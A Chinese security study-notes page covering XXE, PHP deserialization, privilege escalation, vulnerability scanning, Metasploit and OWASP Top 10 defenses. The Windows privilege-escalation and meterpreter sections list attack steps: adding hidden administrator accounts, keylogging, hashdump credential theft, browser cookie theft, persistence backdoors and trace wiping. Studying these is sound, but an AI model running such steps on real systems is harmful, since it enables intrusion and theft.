<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212111224427.png"></p>
<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h3 id="1-原理-3"><a href="#1-原理-3" class="headerlink" title="1.原理"></a>1.原理</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212111648319.png"></p>
<p>一个xml文件包括：文档声明，元素，属性，注释，cdata，特殊字符，处理指令</p>
<h3 id="2-攻击思路"><a href="#2-攻击思路" class="headerlink" title="2.攻击思路"></a>2.攻击思路</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212111952365.png"></p>
<h3 id="3-blind-xxe"><a href="#3-blind-xxe" class="headerlink" title="3.blind xxe"></a>3.blind xxe</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212112137839.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212112150448.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212112326405.png"></p>
<h3 id="4-xxe防御"><a href="#4-xxe防御" class="headerlink" title="4.xxe防御"></a>4.xxe防御</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212112448035.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212112537493.png"></p>
<h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="1-原理-4"><a href="#1-原理-4" class="headerlink" title="1.原理"></a>1.原理</h3><p>序列化是将程序之间的对象 转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序 列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别 为serialize()和unserialize()。 </p>
<p>反序列化本身并不危险,但是如果反序列化时,传入反序列化函数的参数可以被用 户控制那将会是一件非常危险的事情。利用参数输入恶意的字符串值，造成漏洞。 不安全的反序列化造成的危害只有你想不到,没有他做不到</p>
<pre class="line-numbers language-none"><code class="language-none">serialize和unserialize就是用来解决这一问题的。
serialize：可以将变量转换为字符串并且在转换中可以保存当前变量的值；
unserialize：则可以将serialize生成的字符串变换回变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="2-魔术方法magic-function"><a href="#2-魔术方法magic-function" class="headerlink" title="2.魔术方法magic function"></a>2.魔术方法magic function</h3><pre class="line-numbers language-none"><code class="language-none">魔术方法我们着重关注一下几个：
__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用
的。
__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销
毁时执行，当对象被销毁时会自动调用。
__wakeup()：进行unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用
__wakeup()方法,可以进行初始化对象。
__toString()：用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时
就会调用。
__sleep()：当一个对象被序列化的时候被调用,可以设定需要保存的成员属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><pre class="line-numbers language-none"><code class="language-none">和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最
好的预防措施:
1.不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。
2.在进入反序列化函数之前,对参数进行限制过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="windows服务器提权"><a href="#windows服务器提权" class="headerlink" title="windows服务器提权"></a>windows服务器提权</h2><h3 id="1-提权方式"><a href="#1-提权方式" class="headerlink" title="1.提权方式"></a>1.提权方式</h3><p>操作系统漏洞提权</p>
<pre class="line-numbers language-none"><code class="language-none">提权方式:操作系统漏洞提权
根据没有修补的补丁号码，到网上找利用程序，进行利用 。
1 . 访问目标网站
2 . 拿到webshell：通过文件上传，SQL注入，代码执行等等
3 . 上传自己的cmd.exe(因为默认一般不让调用系统的cmd.exe)
4 . 查看服务器信息(网络信息 , 账号信息 , systeminfo系统详细信息 等等)
5 . 利用提权补丁对比工具,查看可以利用的poc(漏洞测试代码程序)
6 . 上传可用的提权程序进行提权
7.比如上传pr.exe，接下来查看并且测试默认权限是什么，可以干什么，利用pr.exe进行提权，注意后面执行的命令使用双引号包裹
8.利用pr.exe提权成功，添加net user 用户名 密码 /add
9.也可以添加隐藏用户 ： net user 用户名$ 密码 /add
10.把用户添加到管理员组 net localgroup administrator 用户名 /add
11.查看当前的系统开启的端口情况：netstat -anp tcp
13.上传一个开3389端口的exp，进行开启
14. 此时虽然端口已经打开,账号也已经 创建完成 , 但是不能直接远程登录,因为我们的物理机跟
web服务器是不能直接通信的,所以要进行端口数据转发
15。端口转发, 网络拓扑解析 , 现在要实现 从2003 server 端口3389传输的数据,使得能在hack
web server 上能进行监听<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三方服务提权</p>
<pre class="line-numbers language-none"><code class="language-none">FTP，mysql，mssql提权
首先要找到目标服务器上的第三方服务:
方式:
1 . 看进程tasklist
2 . 看端口 netstat -ano
3 . 看文件
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><p>• 1.获取操作系统版本号 • 2.搜索exp • 3.反弹shell • 4.尝试利用</p>
<pre class="line-numbers language-none"><code class="language-none">获取发行版本
• cat /etc/issue
• cat /etc/*-release
• cat /etc/lsb-release
•获取内核版本
• cat /proc/version
• uname -a
• uname -mrs
• rpm -q kernel
• dmesg | grep Linux
• ls /boot <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="安全漏洞检测与利用"><a href="#安全漏洞检测与利用" class="headerlink" title="安全漏洞检测与利用"></a>安全漏洞检测与利用</h2><h3 id="1-漏洞信息的组成"><a href="#1-漏洞信息的组成" class="headerlink" title="1.漏洞信息的组成"></a>1.漏洞信息的组成</h3><p> 漏洞名称，发布日期，漏洞编号，风险等级，影响范围，漏洞描述，解决方案</p>
<h3 id="2-常见的系统漏洞扫描器"><a href="#2-常见的系统漏洞扫描器" class="headerlink" title="2.常见的系统漏洞扫描器"></a>2.常见的系统漏洞扫描器</h3><p>软件类：Nmap，NESSUS，openvas</p>
<p>硬件类：绿盟的远程安全评估系统，迪普风险管理系统</p>
<h3 id="3-漏洞扫描基本流程"><a href="#3-漏洞扫描基本流程" class="headerlink" title="3.漏洞扫描基本流程"></a>3.漏洞扫描基本流程</h3><p>存活判断-》端口扫描-》服务识别-》系统识别-》弱口令/登录扫描-》漏洞映射</p>
<h3 id="4-漏洞识别原理"><a href="#4-漏洞识别原理" class="headerlink" title="4.漏洞识别原理"></a>4.漏洞识别原理</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212123542325.png"></p>
<h3 id="5-Nmap扫描漏洞"><a href="#5-Nmap扫描漏洞" class="headerlink" title="5.Nmap扫描漏洞"></a>5.Nmap扫描漏洞</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212123835717.png"></p>
<h3 id="6-NESSUS"><a href="#6-NESSUS" class="headerlink" title="6.NESSUS:"></a>6.NESSUS:</h3><p>是目前全世界用的人最多的一个系统漏洞扫描与分析软件，具有能够提供完整的电脑漏洞扫描服务，并且随时更新漏洞数据库，可同时在本机或者远端上遥控，并且进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整</p>
<h3 id="7-Metasploit介绍与漏洞利用"><a href="#7-Metasploit介绍与漏洞利用" class="headerlink" title="7.Metasploit介绍与漏洞利用"></a>7.Metasploit介绍与漏洞利用</h3><p>metasploit是一个漏洞利用框架，简称msf，允许开发者开发自己的漏洞脚本从而进行测试，是一个很强大的渗透测试框架</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212141311017.png"></p>
<h4 id="metasploit重要模块"><a href="#metasploit重要模块" class="headerlink" title="metasploit重要模块"></a>metasploit重要模块</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212141431591.png"></p>
<h4 id="metasploit常用命令"><a href="#metasploit常用命令" class="headerlink" title="metasploit常用命令"></a>metasploit常用命令</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212141517689.png"></p>
<h4 id="metasploit攻击思路及其流程"><a href="#metasploit攻击思路及其流程" class="headerlink" title="metasploit攻击思路及其流程"></a>metasploit攻击思路及其流程</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212141717069.png"></p>
<h4 id="metasploit进行ms17-010漏洞利用"><a href="#metasploit进行ms17-010漏洞利用" class="headerlink" title="metasploit进行ms17_010漏洞利用"></a>metasploit进行ms17_010漏洞利用</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212142039556.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212142051365.png"></p>
<h4 id="metasploit用ms17-010漏洞–远程监控"><a href="#metasploit用ms17-010漏洞–远程监控" class="headerlink" title="metasploit用ms17_010漏洞–远程监控"></a>metasploit用ms17_010漏洞–远程监控</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212142145935.png"></p>
<h4 id="metasploit扩展模块-meterpreter"><a href="#metasploit扩展模块-meterpreter" class="headerlink" title="metasploit扩展模块-meterpreter"></a>metasploit扩展模块-meterpreter</h4><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212142426303.png"></p>
<h5 id="meterpreter常用命令"><a href="#meterpreter常用命令" class="headerlink" title="meterpreter常用命令"></a>meterpreter常用命令</h5><pre class="line-numbers language-none"><code class="language-none">1.background： 返回，把meterpreter后台挂起
2.session  ： 查看已经成功获取的会话
3.shell：获取目标主机的远程命令行shell，如果出错，考虑是目标主机限制了cmd.exe的访问权
4.cat：查看目标主机上的文档内容
5.getwd：获取系统工作的当前目录
6.upload： 上传文件到目标主机
7.download：把目标主机上的文件下载到我们的攻击主机上
8.edit：调用vi编辑器，对目标主机的文件进行修改
9.search ： 在目标主机文件系统上搜索文件
10.portfwd： 端口转发
11.route：显示目标主机上的主机路由表
12.getuid： 查看meterpreter注入到目标主机的进程的所属用户
13.sysinfo： 查看目标主机的系统信息
14.ps：查看目标主机上运行的进程信息，结合migrate使用
15 migrate： 将meterpreter会话移植到另一个进程
16. execute： 在目标主机上运行某个程序
17.getpid: 获取meterpreter会话在目标主机上注入进程的进程号
18.shutdown：关闭目标主机

19.后渗透模块：post/windows/gater/forensics/enum_drives调用  可以获取目标主机的存储器信息
20.调用post/windows/gather/checkvm后渗透模块，确定目标主机是否是一天虚拟机
     run post/windows/gather/checkvm
21.persistence后渗透模块向目标主机植入后门程序
22.调用getgui后渗透攻击模块：作用：开启目标主机远程桌面，并且可以添加管理员组账号
23.提权命令getsystem:使用getsystem提升当前进程执行账户为system用户，拿到系统最高权限
24.键盘记录器功能：命令：run post/windows/capture/keylog_recorder
25.系统账号密码获取： 命令： run post/windows/gather/hashdump
		在获取system权限的情况下，使用hashdump命令可以到处目标主机的sam文件，获取目标主机的账号密码hash信息，剩下的就可以用爆破软件算出明文密码
26.调用post/windows/gather/enum_applications模块获取目标主机上的软件安装信息
	命令：run post/windows/gather/enum_applications
27.调用post/windows/gather/dumplinks获取目标主机上最近访问过的文档、链接信息
	命令：run post/windows/gather/dumplinks
28.调用post/windows/gather/enum_ie后渗透模块，读取目标主机IE浏览器cookies等缓
	存信息，嗅探目标主机登录过的各类账号密码
	命令：run post/windows/gather/enum_ie
29.clearv 入侵痕迹擦除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="windows系统安全加固"><a href="#windows系统安全加固" class="headerlink" title="windows系统安全加固"></a>windows系统安全加固</h2><h3 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212144747747.png"></p>
<h3 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h3><p>补丁安装，端口封禁（在组策略里面创建ip安全策略）</p>
<h3 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h3><p>账号口令：账号优化，目的是为了树立系统中的账号以及口令，避免默认账号以及弱口令的存在，删除无用账号，锁定、禁用无用账号</p>
<p>​                  口令策略：增强密码复杂度，防止用户长期使用同一个密码，以及账号锁定策略等等，降低系统账号被暴力破解的可能性</p>
<p>授权管理：</p>
<p>授权账号登陆：目的是设置允许从本地或者远程登陆的账号。 </p>
<p>•配置操作：开始运行secpol.msc安全设置本地策略用户权限分配</p>
<h2 id="owasp"><a href="#owasp" class="headerlink" title="owasp"></a>owasp</h2><h3 id="1-woasp-top10"><a href="#1-woasp-top10" class="headerlink" title="1.woasp top10"></a>1.woasp top10</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212150243685.png"></p>
<h4 id="1-注入："><a href="#1-注入：" class="headerlink" title="1.注入："></a>1.注入：</h4><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
<p>防止</p>
<pre class="line-numbers language-none"><code class="language-none">防止注入漏洞需要将数据与命令语句、查询语句分隔开来。
最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。
注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。
使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。
对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。
注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。
在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="2-失效身份认证"><a href="#2-失效身份认证" class="headerlink" title="2.失效身份认证"></a>2.失效身份认证</h4><p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<pre class="line-numbers language-none"><code class="language-none">在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。

不要使用发送或部署默认的凭证，特别是管理员用户。
执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。
将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的记住秘密，或其他现代的基于证据的密码策略相一致。
确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。
限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。
使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="3-敏感信息泄露"><a href="#3-敏感信息泄露" class="headerlink" title="3.敏感信息泄露"></a>3.敏感信息泄露</h4><p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
<pre class="line-numbers language-none"><code class="language-none">对一些需要加密的敏感数据，应该起码做到以下几点：

对系统处理、存储或传输的数据分类，并根据分类进行访问控制。
熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据。
对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过PCI DSS标记或拦截。未存储的数据不能被窃取。
确保存储的所有敏感数据被加密。
确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且密钥管理到位。
确保传输过程中的数据被加密，如：使用TLC。确保数据加密被强制执行，如：使用HTTP严格安全传输协议（HSTS ）。
禁止缓存对包含敏感数据的响应。
确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受范围。
单独验证每个安全配置项的有效性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>4.xxe</p>
<p>许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
<pre class="line-numbers language-none"><code class="language-none">开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺陷还需要：

尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。
及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高版本。
参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。
在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。
验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。
尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关或Web应用程序防火墙（ WAF ）来检测、监控和防止XXE攻<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="5-失效的访问控制"><a href="#5-失效的访问控制" class="headerlink" title="5.失效的访问控制"></a>5.失效的访问控制</h4><p>未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
<pre class="line-numbers language-none"><code class="language-none">访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。

- 除公有资源外，默认情况下拒绝访问。
- 使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化CORS使用。
- 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。
- 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。
- 禁用 Web服务器目录列表，并确保文件元数据（如：git）不存在于 Web的根目录中。
- 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。
- 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。
- 当用户注销后，服务器上的JWT令牌应失效。

开发人员和 QA人员应包括功能访问控制单元和集成测试人员<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="6-安全配置错误"><a href="#6-安全配置错误" class="headerlink" title="6.安全配置错误"></a>6.安全配置错误</h4><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
<pre class="line-numbers language-none"><code class="language-none">应实施安全的安装过程，包括：

一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。这个过程应该是自动化的，以尽量减少安装一个新安全环境的耗费。
搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。
检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，（参见A9：2017-使用含有已知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：S3桶权限）。
一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。
向客户端发送安全指令，如：安全标头。
在所有环境中能够进行正确安全配置和设置的自动化过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>7.跨站脚本xss</p>
<p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点</p>
<pre class="line-numbers language-none"><code class="language-none">防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以通过如下步骤实现：

使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0或 React JS。了解每个框架的XSS保护的局限性，并适当地处理未覆盖的用例。
为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、JavaScript、CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》。
在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。如果这种情况不能避免，可以采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》描述的类似上下文敏感的转义技术应用于浏览器API。
使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有效的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="8-不安全的反序列化"><a href="#8-不安全的反序列化" class="headerlink" title="8.不安全的反序列化"></a>8.不安全的反序列化</h4><p>不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击</p>
<pre class="line-numbers language-none"><code class="language-none">唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。如果上述不可能的话，考虑使用下述方法：

执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。
在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。
如果可能，隔离运行那些在低特权环境中反序列化的代码。
记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。
限制或监视来自于容器或服务器传入和传出的反序列化网络连接。
监控反序列化，当用户持续进行反序列化时，对用户进行警告。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="9-使用含有已知漏洞的组件"><a href="#9-使用含有已知漏洞的组件" class="headerlink" title="9.使用含有已知漏洞的组件"></a>9.使用含有已知漏洞的组件</h4><p>组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响</p>
<pre class="line-numbers language-none"><code class="language-none">应该制定一个补丁管理流程：

移除不使用的依赖、不需要的功能、组件、文件和文档。
利用如 versions、DependencyCheck 、retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息。持续监控如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警告邮件。
仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险
监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="10-不足的日志记录和监控"><a href="#10-不足的日志记录和监控" class="headerlink" title="10.不足的日志记录和监控"></a>10.不足的日志记录和监控</h4><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测</p>
<pre class="line-numbers language-none"><code class="language-none">根据应用程序存储或处理的数据的风险：:

确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。
确保日志以一种能被集中日志管理解决方案使用的形式生成
确保高额交易有完整性控制的审计信息，以防止篡改或删除，例如审计信息保存在只能进行记录增加的数据库表中。
建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。
建立或采取一个应急响应机制和恢复计划，例如：NIST 800-61 rev 2或更新版本。
目前已有商业的和开源的应用程序防护框架（例如：OWASP AppSensor）、Web应用防火墙（例如 ：Modsecurity with theOWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志关联软件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web漏洞扫描与渗透测试"><a href="#web漏洞扫描与渗透测试" class="headerlink" title="web漏洞扫描与渗透测试"></a>web漏洞扫描与渗透测试</h2><h3 id="1-漏洞验证基本流程"><a href="#1-漏洞验证基本流程" class="headerlink" title="1.漏洞验证基本流程"></a>1.漏洞验证基本流程</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212153026312.png"></p>
<h3 id="2-读懂漏洞扫描报告"><a href="#2-读懂漏洞扫描报告" class="headerlink" title="2.读懂漏洞扫描报告"></a>2.读懂漏洞扫描报告</h3><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/image-20211212153114176.png"></p>
